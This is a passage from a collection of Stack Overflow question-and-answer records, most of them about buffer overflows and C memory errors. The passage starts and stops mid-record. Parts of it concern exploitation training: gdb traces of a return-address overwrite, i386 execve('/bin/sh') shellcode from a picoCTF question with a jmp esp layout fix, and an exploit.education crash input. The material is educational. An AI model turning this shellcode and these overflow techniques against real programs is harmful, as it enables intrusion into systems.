0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0xffffd2f0: 0xffffd306  0xffffd6a4  0x00000000  0x080497ec\n0xffffd300: 0x080ade17  0x080e7c04  0x08049030  0x080ae037\n0xffffd310: 0xffffd330  0x080e3ff4  0xffffd428  0x08049ceb\n0xffffd320: 0x00000021  0xffffd338  0x00067e1c  0x08049ceb\n0xffffd330: 0x00000002  0xffffd464  0xffffd470  0xffffd354\n(gdb) c\nContinuing.\n\nBreakpoint 2, main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n(gdb) info reg\neax            0x0                 0\necx            0xffffd6b0          -10576\nedx            0xffffd312          -11502\nebx            0x80e3ff4           135151604\nesp            0xffffd300          0xffffd300\nebp            0xffffd318          0xffffd318\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x8049812           0x8049812 <main+61>\neflags         0x286               [ PF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0xffffd300: 0x080ade17  0x41417c04  0x41414141  0x41414141\n0xffffd310: 0x41414141  0x41414141  0x41414141  0x00414141\n0xffffd320: 0x00000021  0xffffd338  0x00067e1c  0x08049ceb\n0xffffd330: 0x00000002  0xffffd464  0xffffd470  0xffffd354\n0xffffd340: 0x080e3ff4  0x0804968d  0x00000002  0xffffd464\n(gdb) c\nContinuing.\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0804981b in main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n(gdb) info reg\neax            0x0                 0\necx            0x41414141          1094795585\nedx            0xffffd312          -11502\nebx            0x41414141          1094795585\nesp            0x4141413d          0x4141413d\nebp            0x41414141          0x41414141\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x804981b           0x804981b <main+70>\neflags         0x10286             [ PF SF IF RF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0x4141413d: Cannot access memory at address 0x4141413d\n(gdb) c\nContinuing.\n\nProgram terminated with signal SIGSEGV, Segmentation fault.\nThe program no longer exists.\n\n",
        "Answer": "This code\n   0x08049815 <+64>:    pop    %ecx\n   0x08049816 <+65>:    pop    %ebx\n   0x08049817 <+66>:    pop    %ebp\n   0x08049818 <+67>:    lea    -0x4(%ecx),%esp\n   0x0804981b <+70>:    ret\n\nrestores registers from their saved location on stack. However, you've overwritten the stack contents, so all the registers are now set to 0x4141... values. And that causes the lea    -0x4(%ecx),%esp instruction to SIGSEGV, since ECX points to inaccessible memory.\nAs ssbssa commented, this is happening due to stack realignment (which itself is needed to deal with 64-bit aligned (newer) AVX etc.).\nIf I turn stack realignment off with -mpreferred-stack-boundary=2, the code becomes:\n   0x08049176 <+0>:     push   %ebp\n   0x08049177 <+1>:     mov    %esp,%ebp\n   0x08049179 <+3>:     sub    $0xc,%esp\n   0x0804917c <+6>:     mov    0xc(%ebp),%eax\n   0x0804917f <+9>:     add    $0x4,%eax\n   0x08049182 <+12>:    mov    (%eax),%eax\n   0x08049184 <+14>:    push   %eax\n   0x08049185 <+15>:    lea    -0xa(%ebp),%eax\n   0x08049188 <+18>:    push   %eax\n   0x08049189 <+19>:    call   0x8049050 <strcpy@plt>\n   0x0804918e <+24>:    add    $0x8,%esp\n   0x08049191 <+27>:    mov    $0x0,%eax\n   0x08049196 <+32>:    leave\n   0x08049197 <+33>:    ret\n\nand the RIP overwrite works:\nProgram received signal SIGSEGV, Segmentation fault.\n0x41414141 in ?? ()\n(gdb) x/i $pc\n=> 0x41414141:  Cannot access memory at address 0x41414141\n\n",
        "Source": "https://stackoverflow.com/questions/78053915/eip-doesnt-get-overwritten-when-perfoming-a-buffer-overflow-attack"
    },
    {
        "Title": "Buffer Overflow: Why does buffer assignment impact other variables?",
        "Question": "\nvoid foo() {\n    int value = 0;\n    char buf[4];\n    buf[4] = 1;\n\n\n    printf(\"value: %d\\n\", value);\n}\n\nint main() {\n    foo();\n    return 0;\n}\n\n\n\nWhy does 'value' print 1?\nI believe this has to do with buffer overflow and little endian but I am finding it hard to grasp.\n",
        "Answer": "Because it is Undefined Behaviour.\nIt is enough to change the optimization options and you will get different results.\nGodbolt for example:\n\nWith -O0 : 1\nWith -Os : 0\n\nBut it does not have to be like this. It can end up in the segfault or something else may happen.\nhttps://godbolt.org/z/TEbWbMvsa\n\nI understand it's undefined behavior. I was just wondering how this is\nrelated to little endian. When I went past buf[3] into buf[4], it\nstarted changing the next byte in memory. How do I know the next byte\nin memory is 'value'?\n\nYou cant know it. Order is not specified. value can be optimized out and not stored on the stack at all. You need to know your ABI and compiler very well to predict it.\nIn your case:\n+ 0x07: value byte 4  MSB\n+ 0x06: value byte 3\n+ 0x05: value byte 2\n+ 0x04: value byte 1  LSB\n+ 0x03: buf[3]\n+ 0x02: buf[2]\n+ 0x01: buf[1]\n+ 0x00: buf[0]\n\n",
        "Source": "https://stackoverflow.com/questions/77937810/buffer-overflow-why-does-buffer-assignment-impact-other-variables"
    },
    {
        "Title": "ROP - The use of the jmp esp",
        "Question": "I was playing some picoCTF challenges today and I found myself stuck in a challenge.\nDigging around the internet, I found a solution online which I cannot fully grasp.\nThe challenge (whose name I won't spoil for those who are playing picoCTF) revolves around a vulnerable x86 ELF, and it involves using ROP gadgets to gain a shell, however the checksec reveals that the binary is not PIE, and there is no NX enabled.\nBy breaking at ret of the vulnerable function, I noticed that the EAX register contains the start address of the buffer on the stack. Moreover, I found out that the offset between the start of the buffer and the saved EIP is 28 bytes.\nSo my first guess was to craft a sufficiently short shellcode, place it inside the buffer preceeded by a NOP sled, and overwrite the saved EIP with a gadget jumping to the content of the EAX register, aka the start of my buffer.\nHowever, I found out that this approach is not working.\nThe shellcode I crafted is:\nint 0x3   ; used for debugging purposes\nxor eax, eax\npush eax\npush 0x0068732f\npush 0x6e69622f\nxor ebx, ebx\npush eax\npush ebx\nmov ecx, esp\nmov al, 0xb\nint 0x80\n\nI assembled it using pwntool's asm library, setting the architecture to i386.\nThe debugger reveals the following after few steps in:\npwndbg> \n\nProgram received signal SIGSEGV, Segmentation fault.\n0xff854a01 in ?? ()\nLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ REGISTERS / show-flags off / show-compact-regs off ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n EAX  0x0\n EBX  0x0\n ECX  0x80e5300 (_IO_2_1_stdin_) \u25c2\u2014 0xfbad2088\n EDX  0xff854a10 \u2014\u25b8 0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n EDI  0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n ESI  0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n EBP  0x90909090\n ESP  0xff854a00 \u25c2\u2014 0x0\n EIP  0xff854a01 \u25c2\u2014 0x2f000000\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM / i386 / set emulate on ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n   0xff8549f3    push   eax\n   0xff8549f4    push   0x68732f\n   0xff8549f9    push   0x6e69622f\n   0xff8549fe    xor    ebx, ebx\n   0xff854a00    add    byte ptr [eax], al\n    \u2193\n \u25ba 0xff854a01    add    byte ptr [eax], al\n   0xff854a03    add    byte ptr [edi], ch\n   0xff854a05    bound  ebp, qword ptr [ecx + 0x6e]\n   0xff854a08    das    \n   0xff854a09    jae    0xff854a73                    <0xff854a73>\n    \u2193\n   0xff854a73    add    byte ptr [eax], al\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ STACK ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n00:0000\u2502 esp eip-1 0xff854a00 \u25c2\u2014 0x0\n01:0004\u2502           0xff854a04 \u25c2\u2014 '/bin/sh'\n02:0008\u2502           0xff854a08 \u25c2\u2014 0x68732f /* '/sh' */\n03:000c\u2502           0xff854a0c \u25c2\u2014 0x0\n04:0010\u2502 edx       0xff854a10 \u2014\u25b8 0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n... \u2193              2 skipped\n07:001c\u2502           0xff854a1c \u25c2\u2014 0x3e8\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ BACKTRACE ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \u25ba f 0 0xff854a01\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\npwndbg> \n\nMeaning that the execution is breaking at 0xff854a00.\nNow the solution I found online involved crafting the overflow string in the following way:\n\nWrite 6 NOPs.\nPlace the assembled instruction for jmp esp\nWrite 20 more NOPs.\nPlace the jmp eax gadget to jump to the start of the buffer, overwriting the saved EIP.\nAppend the shellcode.\n\nFrom what I've understood, the jmp ESP instruction allows to direct the execution right after the ret instruction, thus jumping inside the shellcode, but I would like to know more about this.\nI even tried recalling the x86 Call/Return Protocol, but it seems that I cannot fully grasp how jumping to the stack would actually resolve the challenge.\nI seek your help.\nThanks!\n",
        "Answer": "Your code is on the stack under the stack pointer. Part of it is overwritten by your own push instructions. Notice that bound ebp, qword ptr [ecx + 0x6e] has machine code 62 69 6E which corresponds to push 0x6e69622f. Adjusting esp downwards by a suitable amount should fix the problem, e.g. sub esp, 32\nThe other solution works around the problem by putting most of the shellcode above the stack pointer and only using a single jmp esp to transfer control. Here is an illustration of the memory layout:\n|    ...      |           |     ^       |\n|    ...      |           |     |       |\n|    ...      |           |     |       |\n|    ...      | <= ESP => |  shellcode  |\n+-------------+           +-------------+\n|  ret addr   |  jmp eax  |  ret addr   |\n+-------------+           +-------------+\n| pushed data |           | pushed data |\n|     |       |           |     |       |\n|     |       |           |     |       |\n|     v       |           |     v       |\n|  !overlap!  |           |    ...      |\n|     ^       |           |   jmp esp   |\n|     |       |           |    nop      |\n|     |       |           |    nop      |\n|  shellcode  | <= EAX => |    nop      |\n+-------------+           +-------------+\n\nThe initial nops are probably not needed, it should work fine with the jmp esp followed by 26 nops (or whatever padding since it's not going to be executed) instead.\n",
        "Source": "https://stackoverflow.com/questions/77832621/rop-the-use-of-the-jmp-esp"
    },
    {
        "Title": "why is my malloc(1) segfaulting my program?",
        "Question": "I have a problem in my C program that makes it so that it segfaults on malloc(1). I've spent many hours trying to find out why it segfaults but\nI just can't figure it out. This portion of my program separates strings using identifiers. Example, string=\"12wo4ne53wone86wo99w5ne\"; identifiers, start=\"wo\", end=\"ne\"; would return {\"wo4ne\", \"wone\", \"wo99w5ne\"}.\nMy code is as follows.\n// basically like substring() in java\nchar* stringAt(char* str, int start, int end) {\n    int length = end - start + 1;\n    int temp = start;\n    char* savedChar = NULL;\n    savedChar = malloc(length + 1);\n    for(int x = 0; x < length; x++) {\n        savedChar[x] = str[temp];\n        temp++;\n    }\n    savedChar[length] = '\\0';\n    return savedChar;\n}\n\n// finds \"identifier\" in string after certain position in that string\nint findIdentifier(char* str, char* identifier, int pos, int isEnd) {\n\n    // checks first character with first character in \"identifier\"\n    for(int x = pos; x < strlen(str) - 1; x++) {\n        if(str[x] == identifier[0]) {\n\n            // if first characters match then check rest\n            for(int i = 0; i < strlen(identifier); i++) {\n                if(str[x + i] != identifier[i]) {\n                    i = strlen(identifier);\n                }\n                if(i == strlen(identifier) - 1) {\n\n                    // isEnd checks if you should count the last position of the identifier...\n                    // -like ident=\"1234\" then \"end\" is the position of \"4\".\n                    // -not end be the position of \"1\"\n                    if(isEnd == 1) {\n                        return x + strlen(identifier) - 1;\n                    }\n                    return x;\n                }\n            }\n        }\n    }\n    return -1;\n}\n\nchar** separateStrings(char* str, char* identifier, char* lastIdentifier) {\n    char** savedStr = NULL;\n\n    // segfault here!\n    savedStr = malloc(1);\n    // segfualt here!\n\n    int start = -2;\n    int end = 0;\n    int x = 0;\n    do {\n\n    // first run check/gets first and last positions of the identifier in the string\n    if(start == -2) {\n        start = findIdentifier(str, identifier, 0, 0);\n    } else {\n    start = findIdentifier(str, identifier, end + 1, 0);\n    }\n    end = findIdentifier(str, lastIdentifier, start + 1, 1);\n    \n    if(start != -1) {\n        if(end == -1) {\n            end = strlen(str);\n        }\n        char* newStr = stringAt(str, start, end);\n\n        // dynamically increase the size of savedStr (x is iterated every run through here)\n        realloc(savedStr, x + 1);\n        savedStr[x] = malloc(strlen(newStr) + 1);\n        strcpy(savedStr[x], newStr);\n        x++;\n    }\n\n    } while(start != -1 && end != -1);\n    return savedStr;\n}\n\nI have tried looking up why this could not be working and the only thing I can think of is a Buffer Overflow. So I then tried to run findIdentifier() many times but that works fine.\nThe program is also inconsistent and sometimes runs farther into the code than others but is accurate with its outcomes.\n",
        "Answer": "If savedStr is supposed to be a dynamically allocated array of strings, then allocating 1 byte of memory is not sufficient to store a pointer to a char (depending on your platform, this requires either 4 or 8 bytes).\nEven when you realloc it to be larger, you're only adding 1 byte at a time. This when you reference and assign with savedStr[x] = malloc(strlen(newStr) + 1); you're invoking undefined behavior, which in this case it would seem has manifested as a segmentation fault.\nYou almost certainly want to allocate:\nsavedStr = malloc(sizeof(char *));\n\nAnd then when you re-allocate:\nrealloc(savedStr, (x + 1) * sizeof(char *));\n\nBut you also want to capture the pointer realloc returns. If you're not too worried about allocation error checking:\nsavedStr = realloc(savedStr, (x + 1) * sizeof(char *));\n\nBreaking out the dynamically resized string vector problem\nOne of the core problems your code solves is having an array that grows dynamically. If you break this bit of code out, then you can approach the remainder of your program without worrying about the memory management.\nThe size of the array doubles when needed rather than growing by a single entry to minimize allocations. There may be more ideal growth factors for efficiency.\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n\nstruct string_vec {\n    char **data;\n    size_t cap;\n    size_t sz;\n};\n\nstruct string_vec *string_vec_new(size_t cap) {\n    struct string_vec *vec = malloc(sizeof(struct string_vec));\n    if (!vec) return NULL;\n\n    *vec = (struct string_vec){\n        .data = malloc(sizeof(char *) * cap),\n        .cap = cap,\n        .sz = 0\n    };\n\n    return vec;\n}\n\nstruct string_vec *string_vec_add(\n    struct string_vec *vec,\n    const char *str\n) {\n    if (vec->sz < vec->cap) {\n        vec->data[vec->sz++] = strdup(str);\n        return vec;\n    }\n\n    char **new_data = realloc(vec->data, sizeof(char *) * vec->cap * 2);\n    if (!new_data) return NULL;\n\n    vec->data = new_data;\n    vec->cap *= 2;\n    vec->data[vec->sz++] = strdup(str);\n\n    return vec;\n}\n\nvoid string_vec_del(struct string_vec *vec) {\n    for (size_t i = 0; i < vec->sz; i++) {\n        free(vec->data[i]);\n    }\n\n    free(vec->data);\n}\n\n",
        "Source": "https://stackoverflow.com/questions/77724594/why-is-my-malloc1-segfaulting-my-program"
    },
    {
        "Title": "How to properly memcpy without overflow issues",
        "Question": "In a legacy code I am getting buffer overflow errors in fortify audit.\nLet me explain the issue here:\nI have a function, say foo(size_t len, unsigned char **buf)  ,in this foo I am memcopying a string variable in buf as follows.\nchar temp[256];\n\nsprintf(temp, \"abcd%s\",somefunct_string.c_str()); //so the string temp is variable length\n\nmemcpy(*buf, temp, temp.length()); \n\nin practical, the temp.length() is always < len (which is buf alloted size). But fortify would give potential risk here.\nhow do i resolve this?\n",
        "Answer": "Try calling the std::string::data() function to access the string via a pointer to the string.\nmemcpy(*buf, somefunct_string.data(), somefunct_string.size());\n\nAlso, memcpy_s() is available since C11.\nmemcpy_s(*buf, temp.length(), somefunct_string.data(), somefunct_string.size())\n\nmemcpy() and memcpy_s() are called when copying a sequence from one array to another array.  If the copy overlaps within the same array, memmove() or memmove_s() should be called.\n",
        "Source": "https://stackoverflow.com/questions/77593393/how-to-properly-memcpy-without-overflow-issues"
    },
    {
        "Title": "Why getting &quot;segmentation fault&quot; when sending 127 characters to a buffer with capacity of 128",
        "Question": "I have the following code taken from a binary exploitation exercises:\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n\n#define BANNER \\\n  \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"\n\nchar *gets(char *);\n\nvoid start_level() {\n  char buffer[128];\n  gets(buffer);\n}\n\nint main(int argc, char **argv) {\n  printf(\"%s\\n\", BANNER);\n  start_level();\n}\n\nMy question is regarding the way the buffer stores the information.\nOur buffer has storage for 128 characters.\nWhen I send 127 characters I am getting segmentation fault:\nuser@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print(\"A\"*127)'  | ./stack-five \nWelcome to phoenix/stack-five, brought to you by https://exploit.education\nSegmentation fault\n\n\nBut if I send 126 characters, there is not error:\nuser@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print(\"A\"*126)'  | ./stack-five \nWelcome to phoenix/stack-five, brought to you by https://exploit.education\nuser@phoenix-amd64:\n\nIf the buffer has capacity of 128, and I sent it 127 characters, why it failed? It should have at least one more place no?\nOne thing I though is maybe after sending 127 characters, it adds the NULL terminator (\\x00) but even if that happens, we have exactly 128 characters, so why it crash?\n",
        "Answer": "You have a buffer overflow between the '\\n' that Python print() adds and the '\\0' you need for the string that c adds:\n[python3 -c 'print(\"A\"*126)' | wc -c\n127\n\nI would fix that in Python with:\npython3 -c \"print('A'*126, end='')\" | wc -c\n126\n\ngets() is unsafe so use fgets() instead.\n",
        "Source": "https://stackoverflow.com/questions/77504824/why-getting-segmentation-fault-when-sending-127-characters-to-a-buffer-with-ca"
    },
    {
        "Title": "C problem about Compiler and Memory Theory",
        "Question": "Without calling any \"call\" or \"jump\" function, we need to get a output in order of \"this is the first\" then \"this is the second.\". In my opinion we need to use \"bold\" with the use of Memory and instructions. Also we cannot call the function of \"study\".\n#include <stdio.h>\n\nvoid study()\n{\n    printf(\"this is the second.\\n\");\n}\n\nvoid study2()\n{\n    int bold[4];\n    // can only modify this section BEGIN\n    // cant call study(), maybe use study(pointer to function)\n\n\n    // can only modify this section END\n    printf(\"this is the first\\n\");\n}\n\nint main(int argc, char *argv[])\n{\n    study2();\n    return 0;\n}\n\n",
        "Answer": "Perhaps not what OP had in mind, yet macros do the trick.\n#include <stdio.h>\n\nvoid study() {\n  printf(\"this is the second.\\n\");\n}\n\nvoid study2() {\n  int bold[4];\n  // can only modify this section BEGIN\n  // Without calling any \"call\" or \"jump\" function, \n  #define F1 study\n  #define F2 study2\n  #define study2() F2(); F1();\n  // can only modify this section END\n  printf(\"this is the first\\n\");\n}\n\nint main(int argc, char *argv[]) {\n  study2();\n  return 0;\n}\n\nOutput\nthis is the first\nthis is the second.\n\n\nMaybe violates <Also we cannot call the function of \"study\".>.  Depends on \"we\", if \"we\" is the portion of code between BEGIN ... END, it is OK.\nElse if \"we\" is anywhere in code, than maybe a direct approach:\nvoid study2() {\n  int bold[4];\n  // can only modify this section BEGIN\n  #define printf(x) printf(\"this is the first\\nthis is the second.\\n\")\n  // can only modify this section END\n  printf(\"this is the first\\n\");\n}\n\n\n@Peter Cordes suggests a 3rd way, where our modification does not call study().\nvoid study2() {\n  int bold[4];\n  // can only modify this section BEGIN\n  atexit(study);\n  // can only modify this section END\n  printf(\"this is the first\\n\");\n}\n\n",
        "Source": "https://stackoverflow.com/questions/77399108/c-problem-about-compiler-and-memory-theory"
    },
    {
        "Title": "&#39;malloc(): corrupted top size&#39; After allocating more than 200K int",
        "Question": "I got assignment to do Bucket Sort with openMP, and I decided to do Quick Sort on each bucket. The requirement wants me to test by keep increasing the amount of integers and change the number of thread until reaching 1 million integers with 16 threads.\nHere's my code in C:\n#include <stdio.h>\n#include <omp.h>\n#include <time.h>\n#include <stdlib.h>\n#include <math.h>\n\nvoid swap(int* a, int* b) {\n    int temp = *a;\n    *a = *b;\n    *b = temp;\n\n}\n\nint partition(int arr[], int low, int high) {\n\n    int pivot = arr[high];\n    int i = low - 1;\n\n    for (int j = low; j < high; j++) {\n\n        if (arr[j] <= pivot) {\n            i++;\n            swap(&arr[i], &arr[j]);\n        }\n\n    }\n\n    swap(&arr[i + 1], &arr[high]);\n\n    return (i + 1);\n}\n\nvoid quickSort(int arr[], int low, int high) {\n\n    if (low < high) {\n        int pi = partition(arr, low, high);\n\n        quickSort(arr, low, pi - 1);\n        quickSort(arr, pi + 1, high);\n    }\n\n}\n\nint main(int argc, char* argv[]) {\n\n    //Check arguments\n    if (argc > 3 || argc < 3) {\n        fprintf(stderr, \"Error: Invalid arguments. This program require 2 arguments.\\nUsage: ./bucketSort <thread number> <amount of random number>\\n\");\n        return 1;\n    }\n\n    printf(\"Random seed\");\n\n    //Initialize random seed\n    srand((unsigned)time(NULL));\n\n    int threadNum = atoi(argv[1]);\n    int randomTime = atoi(argv[2]);\n\n    int* numArr = (int*)malloc(randomTime * sizeof(int));\n\n    if(numArr == NULL){\n        fprintf(stderr, \"Error: Unable to allocate memory.\");\n        return 1;\n    }\n\n    printf(\"\\nStart random\");\n\n    //Since RAND_MAX is limited to 0x7FFF (32,767), so we need to get creative to random beyond RAND_MAX\n    for (int i = 0; i < randomTime; i++) {\n\n        int rand1 = rand();\n        int rand2 = rand();\n        int rand3 = rand();\n\n        int combinedRandom = ((rand1 % 100) * 1000) + ((rand2 % 100) * 10) + (rand3 % 10);\n\n        numArr[i] = combinedRandom;\n\n    }\n\n    printf(\"\\nFinished Random\");\n\n    double timeSpent = 0;\n\n    int rangePerBucket = ceil(99999 / threadNum);\n\n    int* outputArr = (int*)malloc(randomTime * sizeof(int));\n\n    int* groupMemberCount = (int*)malloc(threadNum * sizeof(int));\n\n    if(outputArr == NULL || groupMemberCount == NULL){\n        fprintf(stderr, \"Error: Unable to allocate memory.\");\n        return 1;\n    }\n\n    clock_t begin = clock();\n\n    printf(\"\\nStart parallel section.\");\n\n    #pragma omp parallel shared(numArr, outputArr, groupMemberCount) num_threads(threadNum)\n    {\n\n        int myID = omp_get_thread_num();\n        int totalThread = omp_get_num_threads();\n\n        int beginRange = myID * rangePerBucket;\n        int endRange = (myID + 1) * rangePerBucket - 1;\n\n        int* temp = (int*)omp_alloc(rangePerBucket * sizeof(int), omp_large_cap_mem_alloc);\n\n        if( temp == NULL ){\n            fprintf(stderr, \"Error: Thread %d is unable to allocate memory.\", myID);\n\n        }\n\n        int memberCount = 0;\n\n        //Put in bucket\n        for (int j = 0; j < randomTime; j++)\n        {\n            if (numArr[j] >= beginRange && numArr[j] <= endRange) {\n                temp[memberCount] = numArr[j];\n                memberCount++;\n            }\n        }\n\n        groupMemberCount[myID] = memberCount;\n\n        int* myGroup = (int*)omp_alloc(memberCount * sizeof(int), omp_large_cap_mem_alloc);\n\n        if( myGroup == NULL ){\n            fprintf(stderr, \"Error: Thread %d is unable to allocate memory.\", myID);\n        }\n\n        for (int i = 0; i < memberCount; i++) {\n            myGroup[i] = temp[i];\n        }\n\n        //Sort\n        quickSort(myGroup, 0, memberCount - 1);\n        